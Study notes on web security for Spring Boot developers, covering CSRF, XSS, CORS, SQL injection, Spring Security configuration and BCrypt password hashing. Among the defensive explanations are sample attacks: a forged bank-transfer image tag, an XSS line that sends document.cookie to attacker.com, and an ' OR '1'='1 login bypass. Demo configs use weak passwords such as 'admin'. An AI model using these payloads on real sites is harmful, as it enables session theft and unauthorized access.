=======================================
ğŸ”· CSRF (Cross-Site Request Forgery)
=======================================
CSRF is an attack where a user is tricked into doing something they didnâ€™t intend to do.
â¤ The user is already logged in
â¤ The browser automatically sends cookies
â¤ An attacker abuses this trust
ğŸ‘‰ Important: CSRF happens only when authentication is cookie-based (session-based).


âœ… Simple Real-Life Example
Normal Flow (No Attack)
1ï¸âƒ£ You login to bank.com
2ï¸âƒ£ Bank stores login info in a cookie
3ï¸âƒ£ You click â€œTransfer â‚¹10,000â€
4ï¸âƒ£ Browser sends cookie â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ bank trusts it â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ money transferred âœ…


ğŸ”„ CSRF Attack Flow
1ï¸âƒ£ You login to bank.com
2ï¸âƒ£ You open a malicious website
3ï¸âƒ£ That site secretly sends a request:
<img src="https://bank.com/transfer?amount=10000&to=hacker" />
4ï¸âƒ£ Browser automatically attaches your bank cookie
5ï¸âƒ£ Bank thinks YOU sent the request
6ï¸âƒ£ Money transferred âŒ
ğŸ‘‰ This is CSRF


ğŸ”„ Why Browser Is the Problem?
Because:
â¤ Browsers automatically send cookies
â¤ Server cannot distinguish real vs fake request


ğŸ”„ How CSRF Is Prevented
ğŸ‘‰ Add a secret token to every request
ğŸ‘‰ Attacker cannot guess or read this token
This is called a CSRF Token


ğŸ”„ What is a CSRF Token?
â¤ A random, unpredictable value
â¤ Generated by the server
â¤ Sent to the client
â¤ Client must send it back with every request

âœ… Example
POST /transfer
X-CSRF-TOKEN: a8f9c2e3...
â¤ If token is missing or wrong â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ request rejected âŒ


ğŸ”„ CSRF in Spring Security
Spring Security:
â¤ Enables CSRF protection by default
â¤ Applies it to state-changing requests:
    âœ”ï¸ POST
    âœ”ï¸ PUT
    âœ”ï¸ DELETE
    âœ”ï¸ PATCH
âœ… GET requests are not protected (they should not change state)


ğŸ”„ How Spring Security CSRF Works (Internals)
1ï¸âƒ£ User logs in
2ï¸âƒ£ Spring generates CSRF token
3ï¸âƒ£ Token stored in: HTTP Session
4ï¸âƒ£ Token sent to client via:
    âœ”ï¸ HTML form hidden field
    âœ”ï¸ OR response header
5ï¸âƒ£ Client sends token back
6ï¸âƒ£ Spring compares tokens
7ï¸âƒ£ If match â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ request allowed


ğŸ”„ CSRF Token Storage Options
Default (Most Common)
HttpSessionCsrfTokenRepository

â¤ Stored in session
â¤ Secure
â¤ Requires session-based auth


ğŸ”„ Cookie-based (For SPA)
CookieCsrfTokenRepository

â¤ Token stored in cookie
â¤ Used with React / Angular / Vue

âœ… Example: CSRF Enabled (Default)
@Bean
SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
        .formLogin();

    return http.build();
}
ğŸ‘‰ CSRF is ON automatically


ğŸ”„ How Frontend Sends CSRF Token
HTML Form
<input type="hidden" name="_csrf" value="token_here">
ğŸ‘‰ Spring auto-injects this in Thymeleaf.

REST / SPA (React)
X-CSRF-TOKEN: token_here


ğŸ”„ When Do We Disable CSRF?
Safe to Disable CSRF ONLY if:
â¤ Authentication is JWT-based
â¤ Token is sent in Authorization header
â¤ No cookies involved

âœ… Example
http.csrf().disable();


â“ Do we need CSRF with JWT?
âœ… NO, if:
â¤ JWT is sent in header
â¤ Auth is stateless

âŒ YES, if: JWT is stored in cookies


ğŸ”„ Partial CSRF Disable
http.csrf(csrf -> csrf
    .ignoringRequestMatchers("/api/auth/**")
);
Used when:
    âœ”ï¸ Login API is public
    âœ”ï¸ Other endpoints still protected


ğŸ”„ Common CSRF Errors
âŒ 403 Forbidden
â¤ CSRF token missing
â¤ Token mismatch
â¤ Frontend not sending token

âŒ Works in Postman, fails in browser
â¤ Browser enforces CSRF
â¤ Postman doesnâ€™t auto-send cookies


ğŸ”„ CSRF vs XSS
| CSRF                    | XSS                         |
| ----------------------- | --------------------------- |
| Uses trusted cookies    | Injects malicious script    |
| Attacker sends request  | Attacker runs JS            |
| Solved using CSRF token | Solved using escaping / CSP |


===============================
ğŸ”· XSS (Cross-Site Scripting)
===============================
XSS is an attack where an attacker injects malicious JavaScript into a trusted website.
â¤ The website runs attackerâ€™s JavaScript
â¤ The code executes in the victimâ€™s browser
â¤ Attacker can steal data, tokens, sessions
ğŸ‘‰ XSS is about running malicious JavaScript in someone elseâ€™s browser.


âœ… Simple Real-Life Example
Imagine a comments section on a website.

Normal Comment
Nice product!

Malicious Comment
<script>alert("Hacked!")</script>

If the website does not sanitize input:
â¤ Script gets saved
â¤ Every user opening the page runs attackerâ€™s JS âŒ


â“ Why XSS Is Dangerous?
Because JavaScript can:
â¤ Read cookies
â¤ Steal JWT tokens
â¤ Modify page content
â¤ Make API calls as the user
â¤ Redirect users to fake pages
ğŸ‘‰ XSS breaks browser trust


ğŸ”„ Types of XSS
1ï¸âƒ£ Stored XSS (Most Dangerous)
â¤ Malicious script is stored in database
â¤ Runs for every user

âœ… Example: <script>fetch('https://attacker.com?c=' + document.cookie)</script>

ğŸ“Œ Common in:
    âœ”ï¸ Comments
    âœ”ï¸ Reviews
    âœ”ï¸ Chat messages


2ï¸âƒ£ Reflected XSS
â¤ Script comes from URL / request
â¤ Immediately reflected in response

âœ… Example: /search?q=<script>alert(1)</script>

ğŸ“Œ Common in:
    âœ”ï¸ Search pages
    âœ”ï¸ Error messages


3ï¸âƒ£ DOM-Based XSS
â¤ Happens purely in browser
â¤ JavaScript modifies DOM using unsafe data

âœ… Example: document.innerHTML = location.hash;
ğŸ‘‰ Harder to detect (no server logs)


ğŸ”„ XSS Attack Flow
1ï¸âƒ£ Attacker injects JS
2ï¸âƒ£ Website renders it without validation
3ï¸âƒ£ Browser executes JS
4ï¸âƒ£ Attacker gains access to user data


ğŸ”„ XSS vs CSRF
| XSS                                 | CSRF                        |
| ----------------------------------- | --------------------------- |
| Attacker runs JS                    | Attacker sends fake request |
| Exploits JS execution               | Exploits cookie trust       |
| Can steal tokens                    | Cannot read responses       |
| Solved by input/output sanitization | Solved by CSRF tokens       |
ğŸ‘‰ XSS can bypass CSRF (If attacker runs JS, they can read CSRF token)


ğŸ”„ How to Prevent XSS
âœ… Rule #1: Never Trust User Input
â¤ Escape output
â¤ Validate input
â¤ Encode data before rendering


ğŸ”„ XSS Prevention in Spring Boot / Spring Security
1ï¸âƒ£ Output Encoding
Spring + Thymeleaf automatically escapes: <p th:text="${comment}"></p>

âŒ Dangerous: <p th:utext="${comment}"></p>


2ï¸âƒ£ Enable HTTP Security Headers
Spring Security helps here ğŸ‘‡

http.headers(headers ->
    headers
        .xssProtection()
        .and()
        .contentSecurityPolicy("script-src 'self'")
);


ğŸ”„ Content Security Policy (CSP)
CSP tells browser: â€œOnly allow scripts from trusted sources.â€
âœ… Example: Content-Security-Policy: script-src 'self'

âœ”ï¸ Blocks inline scripts
âœ”ï¸ Stops most XSS attacks


ğŸ”„ HttpOnly Cookies
Set-Cookie: JSESSIONID=xyz; HttpOnly

ğŸ‘‰ JavaScript cannot access cookies
ğŸ‘‰ Even if XSS happens, cookie theft is blocked


ğŸ”„ XSS + JWT
âŒ JWT in localStorage â†’ easy to steal via XSS
âœ… JWT in HttpOnly cookie â†’ much safer


ğŸ”„ Backend Validation
â¤ Whitelist allowed characters
â¤ Reject <script> tags
â¤ Use libraries like: OWASP Java Encoder


ğŸ”„ Common XSS Mistakes in Real Projects
â¤ Using innerHTML
â¤ Returning raw HTML from backend
â¤ Disabling CSP
â¤ Trusting frontend validation
â¤ Storing JWT in localStorage


ğŸ”„ How Spring Security Helps Against XSS
â¤ Spring Security provides:
â¤ Security headers
â¤ CSP support
â¤ Cookie protection
â¤ Filter-based defense
ğŸ‘‰ But XSS prevention is mostly developer responsibility


==========
ğŸ”· CORS
==========
CORS is a browser security rule that controls which websites are allowed to call your backend APIs.
ğŸ‘‰ It is NOT a backend security feature
ğŸ‘‰ It is enforced by the browser
Server only tells what is allowed. Browser decides whether to block.


ğŸ”„ Why CORS Exists?
Without CORS:
â¤ Any website could call your APIs
â¤ Userâ€™s cookies / tokens could be abused
CORS prevents:  evil.com calling bank.com/api


ğŸ”„ Origin
An origin = protocol + domain + port
âœ… Example:
http://localhost:3000  â† one origin
http://localhost:8080  â† different origin
ğŸ‘‰ Different â†’ CORS applies


ğŸ”„ Simple Example
Frontend (React)
http://localhost:3000

Backend (Spring Boot)
http://localhost:8080
ğŸ‘‰ Browser says: â€œFrontend and backend are different â†’ CORS check requiredâ€


ğŸ”„ How CORS Works
1ï¸âƒ£ Browser sends request
2ï¸âƒ£ Server responds with CORS headers
3ï¸âƒ£ Browser checks headers
4ï¸âƒ£ If allowed â†’ request succeeds âœ…
5ï¸âƒ£ If not â†’ browser blocks âŒ


ğŸ”„ Simple Request vs Preflight Request
1ï¸âƒ£ Simple Request
â¤ GET
â¤ POST (with simple headers)
Browser sends request directly.

2ï¸âƒ£ Preflight Request
For:
â¤ PUT / DELETE
â¤ Custom headers
â¤ Authorization header
â¤ Browser sends: OPTIONS /api/data
ğŸ‘‰ This asks: â€œIs this request allowed?â€


ğŸ”„ Preflight Flow
1ï¸âƒ£ Browser sends OPTIONS request
2ï¸âƒ£ Server responds with headers
3ï¸âƒ£ Browser validates
4ï¸âƒ£ If allowed â†’ Actual request is sent
If preflight fails â†’ actual request never happens âŒ


ğŸ”„ Important CORS Headers
Access-Control-Allow-Origin: http://localhost:3000
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true


ğŸ”„ CORS in Spring Boot
Global Configuration
@Bean
public WebMvcConfigurer corsConfigurer() {
    return new WebMvcConfigurer() {
        @Override
        public void addCorsMappings(CorsRegistry registry) {
            registry.addMapping("/**")
                .allowedOrigins("http://localhost:3000")
                .allowedMethods("GET", "POST", "PUT", "DELETE")
                .allowedHeaders("*")
                .allowCredentials(true);
        }
    };
}


ğŸ”„ CORS in Spring Security
If using Spring Security, WebMvc CORS alone is not enough.

http
    .cors()
    .and()
    .csrf().disable();

And define:
@Bean
CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("http://localhost:3000"));
    config.setAllowedMethods(List.of("GET","POST","PUT","DELETE"));
    config.setAllowedHeaders(List.of("*"));
    config.setAllowCredentials(true);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}


ğŸ”„ Credentials + CORS
If: allowCredentials(true)
âŒ You CANNOT use: Access-Control-Allow-Origin: *
ğŸ‘‰ You must specify exact origin.


ğŸ”„ CORS vs CSRF vs XSS
| CORS                      | CSRF               | XSS                |
| ------------------------- | ------------------ | ------------------ |
| Browser rule              | Server attack      | JS injection       |
| Controls who can call API | Fake requests      | Malicious scripts  |
| Enforced by browser       | Enforced by server | Happens in browser |


ğŸ”„ Common CORS Errors
âŒ CORS policy blocked
â¤ Missing headers
â¤ Wrong origin
â¤ Preflight failing
âŒ Works in Postman, fails in browser

ğŸ‘‰ Postman does NOT enforce CORS
ğŸ‘‰ Browser DOES


==================
ğŸ”· SQL Injection
==================
SQL Injection is an attack where an attacker inserts malicious SQL code into an input field to manipulate the database.
â¤ Backend blindly trusts user input
â¤ Attacker changes the SQL query
â¤ Database executes attackerâ€™s query âŒ


ğŸ”„ Simple Real-Life Example
Vulnerable Login Code âŒ
String query =
  "SELECT * FROM users WHERE username='" + username +
  "' AND password='" + password + "'";

âœ”ï¸ Attacker Input
username: admin
password: ' OR '1'='1

âœ”ï¸ Final Query Executed
SELECT * FROM users WHERE username='admin'
AND password='' OR '1'='1'

âœ”ï¸ '1'='1' is always true
âœ”ï¸ Login bypassed âŒ


ğŸ”„ Why SQL Injection Is Dangerous?
An attacker can:
â¤ Login without password
â¤ Read sensitive data
â¤ Modify data
â¤ Delete tables
â¤ Take full DB control
âœ… Example: DROP TABLE users;


ğŸ”„ Types of SQL Injection
1ï¸âƒ£ Classic / In-band SQLi
â¤ Error-based
â¤ UNION-based

2ï¸âƒ£ Blind SQL Injection
â¤ No errors shown
â¤ Attacker guesses data via true/false

3ï¸âƒ£ Time-Based SQL Injection
â¤ Uses delays (SLEEP(5)) to infer data


ğŸ”„ SQL Injection Attack Flow
1ï¸âƒ£ User sends malicious input
2ï¸âƒ£ Backend concatenates SQL
3ï¸âƒ£ Database executes injected SQL
4ï¸âƒ£ Attacker gains control


ğŸ”„ Why SQL Injection Happens?
â¤ String concatenation in queries
â¤ No input validation
â¤ Using dynamic SQL improperly


ğŸ”„ How to Prevent SQL Injection
âœ… Rule #1: Use Prepared Statements
Prepared statements separate:
    âœ”ï¸ SQL logic
    âœ”ï¸ User input

âœ… Secure Example (Prepared Statement in JDBC)
String sql = "SELECT * FROM users WHERE username=? AND password=?";
PreparedStatement ps = connection.prepareStatement(sql);
ps.setString(1, username);
ps.setString(2, password);
ğŸ‘‰ Input is treated as data, not SQL


âœ… Rule #2: Use Spring Data JPA / Hibernate
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);


ğŸ”„ Spring Data JPA = Safe by Default
â¤ Uses prepared statements internally
â¤ Protects from SQLi automatically
âš ï¸ Except: @Query(value = "SELECT * FROM users WHERE " + condition, nativeQuery = true)


ğŸ”„ Input Validation
â¤ Allow only expected characters
â¤ Length limits
â¤ Reject SQL keywords (basic protection)


ğŸ”„ Stored Procedures â€“ Are They Safe?
âœ”ï¸ Safe only if: Parameters are used
âŒ Unsafe if: Dynamic SQL inside procedure


ğŸ”„ ORM â‰  100% Protection
âŒ Native queries
âŒ Dynamic query building
âŒ String concatenation
ğŸ‘‰ Still vulnerable.


ğŸ”„ SQL Injection vs XSS vs CSRF
| SQL Injection                | XSS               | CSRF                 |
| ---------------------------- | ----------------- | -------------------- |
| Attacks database             | Attacks browser   | Attacks user trust   |
| Server-side                  | Client-side       | Server-side          |
| Fixed by prepared statements | Fixed by encoding | Fixed by CSRF tokens |


ğŸ”„ Real-World Mistakes
â¤ Logging raw SQL with user input
â¤ Dynamic ORDER BY / LIMIT
â¤ Building queries using StringBuilder


==========================================================================================
                              SPRING SECURITY FLOWCHART
==========================================================================================

      [ Request ]
          |
          v
+-----------------------------+
| (Servlet Container) Tomcat  |
+-------------+---------------+
              |
              v
+-------------------------------------------------------+
|                    FILTERS CHAIN                      |
|                                                       |
|   +-----------+                                       |      (If Auth Success)
|   |  Filter 1 | ------------------------------------------------------------------+
|   +-----------+                                       |                           |
|         |                                             |                           |
|         v                                             |                           v
|   +===============================================+   |     +---------------------------+
|   |            SECURITY FILTER CHAIN              |   |     | (Servlets)                |
|   |                                               |   |     |    Dispatcher Servlet     |
|   | +-------------------------------------------+ |   |     +-------------+-------------+
|   | | SecurityContextPersistenceFilter          | |   |                   |
|   | +-------------------------------------------+ |   |                   v
|   | +-------------------------------------------+ |   |     +-------------+-------------+
|   | | UsernamePasswordAuthenticationFilter      | |   |     |       Interceptors        |
|   | | (Initiates Auth for Login)                | |   |     +-------------+-------------+
|   | +---+---------------------------------------+ |   |                   |
|   |     |                                         |   |                   v
|   |     | (1. Pass "Authenticate" Request)        |   |     +-------------+-------------+
|   |     v                                         |   |     |        Controller         |
|   | +-------------------------------------------+ |   |     +---------------------------+
|   | | BasicAuthenticationFilter                 | |   |
|   | +-------------------------------------------+ |   |
|   +=====================+=========================+   |
|                         ^                             |
+-------------------------|-----------------------------+
                          | (3. Return fully "Authenticated" response)
                          | (4. Stores in SecurityContext)
                          |
+-------------------------+-----------------------------------------------------------+
|                               AUTHENTICATION LOGIC                                  |
|                                                                                     |
|    +-------------------------------------------+                                    |
|    | <<Interface>> AuthenticationManager       |                                    |
|    |-------------------------------------------|                                    |
|    | Implementation: ProviderManager           |                                    |
|    +--------------------+----------------------+                                    |
|                         |                                                           |
|                         | (2. Delegates Authentication to)                          |
|                         v                                                           |
|    +-------------------------------------------+                                    |
|    | <<Interface>> AuthenticationProvider      |                                    |
|    +--------------------+----------------------+                                    |
|                         |                                                           |
|          +--------------+------------------+-----------------------+                |
|          |              |                  |                       |                |
|          v              v                  v                       v                |
| +----------------+ +---------+ +------------------------+ +-----------------------+ |
| | DaoAuth...     | | JWT...  | | OAuth2LoginAuth...     | | Auth Provider N...    | |
| | Provider       | | Provider| | Provider               | |                       | |
| +-------+--------+ +---------+ +------------------------+ +-----------------------+ |
|         |                                                                           |
+---------|---------------------------------------------------------------------------+
          |
          | (Specific flow for DaoAuthenticationProvider)
          v
+-------------------------------------------------------------------------------------+
|                             DATA & VERIFICATION LAYER                               |
|                                                                                     |
|   +-----------------------------+                                                   |
|   | DaoAuthenticationProvider   | ------------------------+                         |
|   +-------------+---------------+                         |                         |
|                 |                                         | uses                    |
|                 | uses                                    v                         |
|                 v                            +---------------------------+          |
|   +-----------------------------+            |      PasswordEncoder      |          |
|   | <<Interface>>               |            | (Hashes & matches raw PW) |          |
|   | UserDetailsService          |            +---------------------------+          |
|   +-------------+---------------+                                                   |
|                 |                                                                   |
|        +--------+------------------+                                                |
|        |                           |                                                |
|        v                           v                                                |
| +------------------------+  +----------------------------+                          |
| | InMemoryUserDetails... |  | JdbcUserDetailsManager     |       +--------+         |
| | (Users in RAM)         |  | (Manage users in DB)       | ----> |   DB   |         |
| +------------------------+  +----------------------------+       +--------+         |
|                                                                                     |
+-------------------------------------------------------------------------------------+

=====================
ğŸ”· Spring Security
=====================
Spring Security is a powerful and customizable security framework provided by the Spring ecosystem.
It is used to secure Java web applications, especially Spring Boot applications, by handling
âœ”ï¸ Authentication â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ Who are you
âœ”ï¸ Authorization â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ What are you allowed to do?
ğŸ‘‰ Itâ€™s like a security guard that checks the identity of users and ensures they can only access what theyâ€™re permitted to.


ğŸ”„ Core Features of Spring Security
| Feature                 | Description                                                                   |
| ----------------------- | ----------------------------------------------------------------------------- |
| ğŸ”‘ Authentication      | Verifies the userâ€™s identity (e.g., via username/password, JWT, OAuth2, etc.) |
| ğŸ§¾ Authorization       | Controls access to specific endpoints or resources                            |
| ğŸ§± Session Management  | Handles login sessions, cookies, and logout behavior                          |
| ğŸ•µï¸ CSRF Protection     | Prevents Cross-Site Request Forgery attacks                                   |
| ğŸ›¡ï¸ CORS Handling       | Controls which front-end origins can access backend APIs                      |
| ğŸ”’ Password Encryption | Uses secure hashing (e.g., BCrypt) for passwords                              |
| ğŸŒ Integration Support | Works with JWT, OAuth2 etc.                                                   |


ğŸ”„ How Spring Security Works
1ï¸âƒ£ User sends a request
âœ… Example:
POST /login
{
  "username": "ankur",
  "password": "1234"
}

2ï¸âƒ£ Spring Security intercepts the request
It checks whether the request requires authentication or not.

3ï¸âƒ£ Authentication Manager verifies credentials
â¤ The AuthenticationManager delegates authentication to providers (like a DaoAuthenticationProvider).
â¤ It loads the user using a UserDetailsService from the database or in-memory storage.
â¤ Passwords are compared using a PasswordEncoder (e.g., BCrypt).

4ï¸âƒ£ If successful
â¤ Spring Security generates an Authentication object.
â¤ The userâ€™s details are stored in the SecurityContext.
â¤ The user gains access to secured endpoints.

5ï¸âƒ£ If failed
The framework automatically returns a 401 Unauthorized or 403 Forbidden response.


ğŸ”„ Key Components
| Component             | Description                                                              |
| ----------------------| ------------------------------------------------------------------------ |
| SecurityFilterChain   | Defines which routes are secured and what kind of authentication applies |
| AuthenticationManager | Core engine that performs authentication                                 |
| UserDetailsService    | Loads user info from DB or memory                                        |
| UserDetails           | Represents a single user                                                 |
| PasswordEncoder       | Encrypts and verifies passwords                                          |
| SecurityContextHolder | Stores the authenticated user details in current thread                  |

â¤ By default spring security gives password and after that the endpoints can be accessed by using:
âœ”ï¸ username: user
âœ”ï¸ password: <password given on console>

We can override the default behavior by using:
ğŸ”— spring.security.user.name=your-username
ğŸ”— spring.security.user.password=your-password
ğŸ‘‰ We do not need security for all the endpoints just some of it so we can configure it using configuration file of spring security.

âœ… Example (Modern Spring Boot 3+)
In Spring Boot 3, security configuration uses a bean instead of extending WebSecurityConfigurerAdapter (which is deprecated).

@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable()) // disable CSRF for APIs
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/").permitAll()   // no auth required
                .requestMatchers("/api/admin/").hasRole("ADMIN") // only ADMIN
                .anyRequest().authenticated()                    // others need login
            )
            .httpBasic(Customizer.withDefaults()); // basic auth (username/password)
        return http.build();
    }

    @Bean
    public UserDetailsService userDetailsService() {
        UserDetails user = User.withUsername("ankur")
                .password(passwordEncoder().encode("1234"))
                .roles("USER")
                .build();

        UserDetails admin = User.withUsername("admin")
                .password(passwordEncoder().encode("admin"))
                .roles("ADMIN")
                .build();

        return new InMemoryUserDetailsManager(user, admin);
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
ğŸ‘‰ Now:
âœ”ï¸ /api/public/ â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ accessible to everyone
âœ”ï¸ /api/admin/ â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ accessible only to ADMIN
âœ”ï¸ /api/ â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ requires authentication


ğŸ”„ Types of Authentication 
1ï¸âƒ£ Form Login(Stateful)
2ï¸âƒ£ Basic Authentication(Stateless)
3ï¸âƒ£ JWT(Stateless)
4ï¸âƒ£ OAuth2
    âœ”ï¸ Authorization Code(Stateful or stateless)
    âœ”ï¸ Client Credentials(Stateless)
    âœ”ï¸ Password Grant(Stateless)
5ï¸âƒ£ API Key Authentication(Stateless)


ğŸ”„ Spring Security + Microservices
â¤ In a microservice architecture:
    âœ”ï¸ API Gateway often handles authentication (via JWT).
    âœ”ï¸ Individual microservices use Spring Security to verify and authorize requests based on roles/claims inside the JWT.

â¤ Common pattern:
    âœ”ï¸ Gateway validates the token â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ passes user info in headers.
    âœ”ï¸ Downstream services apply @PreAuthorize or role-based access control.


=====================
ğŸ”· Role-Based Login
=====================
Role-Based Login (or Role-Based Access Control, RBAC) means:
â¤ Users have roles, e.g., USER, ADMIN.
â¤ Access to endpoints is restricted based on roles.
âœ… Example:
âœ”ï¸ /admin/ â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ only ADMIN can access
âœ”ï¸ /user/ â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ only USER or ADMIN can access
âœ”ï¸ /public/ â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ everyone can access

Spring Security makes this easy using:
â¤ hasRole("ROLE")
â¤ hasAuthority("AUTHORITY")
â¤ @PreAuthorize annotations


ğŸ”„ Create Security Configuration
Since WebSecurityConfigurerAdapter is deprecated, use SecurityFilterChain:

@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable()) // for REST APIs
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/").permitAll()
                .requestMatchers("/api/user/").hasRole("USER")
                .requestMatchers("/api/admin/").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .formLogin(Customizer.withDefaults()) // form-based login
            .httpBasic(Customizer.withDefaults()); // basic auth
        return http.build();
    }

    @Bean
    public UserDetailsService userDetailsService() {
        UserDetails user = User.withUsername("ankur")
                .password(passwordEncoder().encode("1234"))
                .roles("USER") // ROLE_USER
                .build();

        UserDetails admin = User.withUsername("admin")
                .password(passwordEncoder().encode("admin"))
                .roles("ADMIN") // ROLE_ADMIN
                .build();

        return new InMemoryUserDetailsManager(user, admin);
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
ğŸ‘‰ roles("USER") automatically adds ROLE_ prefix internally.
ğŸ‘‰ hasRole("USER") checks for ROLE_USER.
ğŸ‘‰ formLogin() enables login page, httpBasic() allows basic auth for APIs


ğŸ”„ Using @PreAuthorize for Method-Level Security
You can secure individual methods instead of entire paths:

@RestController
@RequestMapping("/api")
public class RoleController {

    @PreAuthorize("hasRole('USER')")
    @GetMapping("/user/home")
    public String userHome() {
        return "Welcome User!";
    }

    @PreAuthorize("hasRole('ADMIN')")
    @GetMapping("/admin/home")
    public String adminHome() {
        return "Welcome Admin!";
    }
}

ğŸ‘‰ Enable method-level security:
@EnableMethodSecurity // // Enables @PreAuthorize, @PostAuthorize, @Secured
@Configuration
public class MethodSecurityConfig {}
âœ”ï¸ Spring does not enable method-level security by default.
âœ”ï¸ So you need to explicitly tell Spring: â€œHey, look for method-level security annotations.â€


=============================
ğŸ”· Encoding vs Encrypting
=============================
ğŸ”„ Encoding
Encoding = changing data into another format so it can be transmitted or stored safely.
ğŸ‘‰ It is NOT for security
ğŸ‘‰ Anyone can decode it

âœ… Example
hello â†’ aGVsbG8= (Base64 encoding)

ğŸ”„ Why Encoding is Used
â¤ Data transfer
â¤ Data formatting
â¤ Handling special characters

ğŸ”„ Key Point
âŒ Encoding does not protect data
âŒ No secret key required


ğŸ”„ Encrypting
Encryption = converting data into unreadable form to protect it from unauthorized access.
ğŸ‘‰ Used for security
ğŸ‘‰ Requires a key

âœ… Example
hello â†’ 9f8a7b2c...
Without the key â†’ data is useless


ğŸ”„ Why Encryption is Used
â¤ Protect passwords
â¤ Secure messages
â¤ Secure network communication


âœ… Simple Real-Life Example
1ï¸âƒ£ Encoding
â¤ Sending text in a format computers understand: "@" â†’ %40
â¤ Anyone can decode %40 â†’ @

2ï¸âƒ£ Encryption
â¤ Locking data with a key: Message â†’ Locked box â†’ Key required
â¤ Without key â†’ cannot read message


ğŸ”„ Key Differences
| Encoding              | Encryption               |
| --------------------- | ------------------------ |
| For data formatting   | For data security        |
| No secret key         | Requires secret key      |
| Easily reversible     | Reversible only with key |
| Used for transmission | Used for protection      |
| Example: Base64       | Example: AES, RSA        |


ğŸ”„ Trap âš ï¸
PasswordEncoder does NOT encrypt passwords.
ğŸ‘‰ It hashes them
ğŸ‘‰ Hashing â‰  Encoding â‰  Encryption


ğŸ”„ Where Each is Used (Spring / Backend Context)
â¤ Encoding: URL encoding, Base64
â¤ Encryption: HTTPS (TLS), JWT signing keys
â¤ Hashing: Password storage (BCrypt)


=============================================================
ğŸ”· Password Encoding (Password Encoder in Spring Security)
=============================================================
PasswordEncoder is used to convert a plain password into a secure hashed form and to verify passwords during login.
ğŸ‘‰ It never decrypts passwords
ğŸ‘‰ It only hashes and compares


ğŸ”„ Why Do We Need PasswordEncoder?
âŒ Without PasswordEncoder (BAD)
password = "admin123"

ğŸš« Problems:
â¤ Anyone with DB access can see passwords
â¤ One data leak = all users hacked

âœ… With PasswordEncoder (GOOD)
password = "$2a$10$K9Jv...."

â¤ Password is unreadable
â¤ Even developers canâ€™t see original password
â¤ Safe against DB leaks


ğŸ”„ Where PasswordEncoder Is Used?
1ï¸âƒ£ During User Registration
user.setPassword(passwordEncoder.encode(rawPassword));

2ï¸âƒ£ During Login (Automatically)
Spring Security compares passwords using the encoder.

4ï¸âƒ£ Most Common Implementation: BCryptPasswordEncoder
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}
ğŸ‘‰ BCrypt is the default and recommended encoder


5ï¸âƒ£ How PasswordEncoder Works
There are two main operations:
1ï¸âƒ£ encode(rawPassword)
2ï¸âƒ£ matches(rawPassword, encodedPassword)


Step 1ï¸âƒ£: Encoding a Password (Registration Time)
âœ… Example
Raw password: admin123

ğŸ”— What BCrypt does internally:
Step 1ï¸âƒ£: Generate Salt
Salt = random string (e.g. $2a$10$K9Jv...)

â¤ Salt is random
â¤ Different for every user
â¤ Prevents rainbow-table attacks

Step 2ï¸âƒ£: Hash Password + Salt
hash = BCrypt(admin123 + salt)

â¤ Uses one-way hashing
â¤ Cannot be reversed


Step 3ï¸âƒ£: Store Everything Together
$2a$10$<salt><hash>
ğŸ‘‰ Stored in DB as ONE string

ğŸ‘‰ Salt is stored inside the encoded password itself
ğŸ‘‰ You donâ€™t manage salt manually.


Step 2ï¸âƒ£: Password Verification (Login Time)
ğŸ”— User logs in with: admin123
ğŸ”— Spring Security does: passwordEncoder.matches(rawPassword, storedEncodedPassword)


Internal Steps of matches():
1ï¸âƒ£ Extract salt from stored hash
2ï¸âƒ£ Hash entered password using SAME salt
3ï¸âƒ£ Compare generated hash with stored hash
4ï¸âƒ£ If match â†’ login success âœ…
ğŸ‘‰ No decryption involved âŒ


ğŸ”„ Why BCrypt Is Secure?
â¤ Uses adaptive hashing
â¤ Supports work factor (strength)
â¤ Slow by design â†’ protects against brute-force
âœ… Example: new BCryptPasswordEncoder(12);

ğŸ‘‰ Higher strength = slower hashing = more secure


ğŸ”„ PasswordEncoder Interface (Behind the Scenes)
public interface PasswordEncoder {

    String encode(CharSequence rawPassword);

    boolean matches(CharSequence rawPassword, String encodedPassword);
}


ğŸ”„ Other PasswordEncoders (FYI)
| Encoder                      | Status          |
| ---------------------------- | -------------   |
| BCryptPasswordEncoder        | âœ… Recommended |
| PBKDF2PasswordEncoder        | âœ… Secure      |
| SCryptPasswordEncoder        | âœ… Secure      |
| NoOpPasswordEncoder          | âŒ Never use   |
| MessageDigestPasswordEncoder | âŒ Deprecated  |


ğŸ”„ JDBC Authentication
â¤ Spring Security loads users and their roles from a relational database.
â¤ Instead of in-memory users, credentials (username, password, roles) are stored in tables.
